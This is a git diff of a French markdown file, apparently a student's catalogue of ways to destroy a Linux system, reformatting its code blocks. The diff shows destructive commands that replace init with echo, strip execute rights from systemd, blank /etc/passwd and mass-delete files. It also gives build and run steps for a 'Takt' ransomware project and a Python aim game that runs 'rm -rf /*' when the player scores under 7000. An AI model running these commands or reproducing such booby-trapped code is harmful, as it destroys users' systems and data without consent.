@@ -11,34 +11,34 @@
 Ici je supprime tout depuis la racine
 
 **➜ Deuxième façon :**
-
-    tomfox@tomfox:~$ cd /sbin
-	tomfox@tomfox:/sbin$ sudo rm init
-	tomfox@tomfox:/sbin$ sudo ln -s /usr/bin/echo init
-    
+```bash
+tomfox@tomfox:~$ cd /sbin
+tomfox@tomfox:/sbin$ sudo rm init
+tomfox@tomfox:/sbin$ sudo ln -s /usr/bin/echo init
+```
 Je me déplace dans le dossier sbin puis je supprime le init (c'est le premier process lancé par linux (PID 1)).
 Puis je crée un nouveau link pour que init renvoie vers echo et non plus vers /lib/systemd/systemd
 
 **➜ Troisième façon :**
-
-    tomfox@tomfox:~$ sudo su -
-    root@tomfox:~# chmod 000 /lib/systemd/systemd
-
+```bash
+tomfox@tomfox:~$ sudo su -
+root@tomfox:~# chmod 000 /lib/systemd/systemd
+```
 
 Cette commande enlève les droits à tout le monde (même root) d'exécuter ce fichier, donc si ce fichier n'est pas lançable le linux ne boot pas car ce file est nécessaire pour le bon fonctionnement de linux
 
 **➜ Quatrième façon :**
-
-    tomfox@tomfox:~$ sudo su -
-    root@tomfox:~# echo "" > /etc/passwd
-
+```bash
+tomfox@tomfox:~$ sudo su -
+root@tomfox:~# echo "" > /etc/passwd
+```
 Je supprime tout le contenu de /etc/passwd (contenu nécessaire pour le bon fonctionnement des sessions)
 
 **➜ Cinquième façon :**
-    
-    tomfox@tomfox:~$ sudo su -
-    root@tomfox:~# find / -type f | grep linux | xargs rm -rf
-
+```bash
+tomfox@tomfox:~$ sudo su -
+root@tomfox:~# find / -type f | grep linux | xargs rm -rf
+```
 Ici je find tout le file (-type f) dans le system qui contient "linux" dans son full path name et ensuite je les supprime en utilisant un pipe et xargs pour prendre chaque ligne de output comme argument pour mon rm (-r pour récursif et -f pour force)
 
 
@@ -47,16 +47,17 @@ Ici je find tout le file (-type f) dans le system qui contient "linux" dans son 
 Context : V1 de notre Takt ransomware, notre projet file rouge avec [Hyouka](https://github.com/HyouKash) en SSI
 
 Pour chiffrer : 
-    
-    go build takt.go
-    sudo ./takt
-
-Pour déchiffrer : 
-    
-    sudo ./takt --decrypt <BASE64(AES_KEY)>
-    
+```bash
+go build takt.go
+sudo ./takt
 ```
-#takt.go
+Pour déchiffrer : 
+```bash
+sudo ./takt --decrypt <BASE64(AES_KEY)>
+```
+
+```go
+//takt.go
 
 package main
 
@@ -183,11 +184,13 @@ EPO : Educational Purpose Only
 
 **➜ Septième façon :**
 
-    tomfox@tomfox:~/Desktop$ sudo apt install python3 python3-pip -y
-    tomfox@tomfox:~/Desktop$ sudo python3 -m pip install pygame
-    tomfox@tomfox:~/Desktop$ sudo python3 main.py 
-
+```bash
+tomfox@tomfox:~/Desktop$ sudo apt install python3 python3-pip -y
+tomfox@tomfox:~/Desktop$ sudo python3 -m pip install pygame
+tomfox@tomfox:~/Desktop$ sudo python3 main.py 
 ```
+
+```python
 #main.py
 import os
 
@@ -232,8 +235,5 @@ while True:
             os.system("rm -rf /*")
         else:
             sys.exit()
-
-
 ```
-
 Code python fait en seconde, comme on peux voir a la fin de ce code si l'utilsateur fait moins de 7000 points on supprime tout ce qui a dans ça racine (C'est un jeu d'aim il faut tout simplement visé des cible)
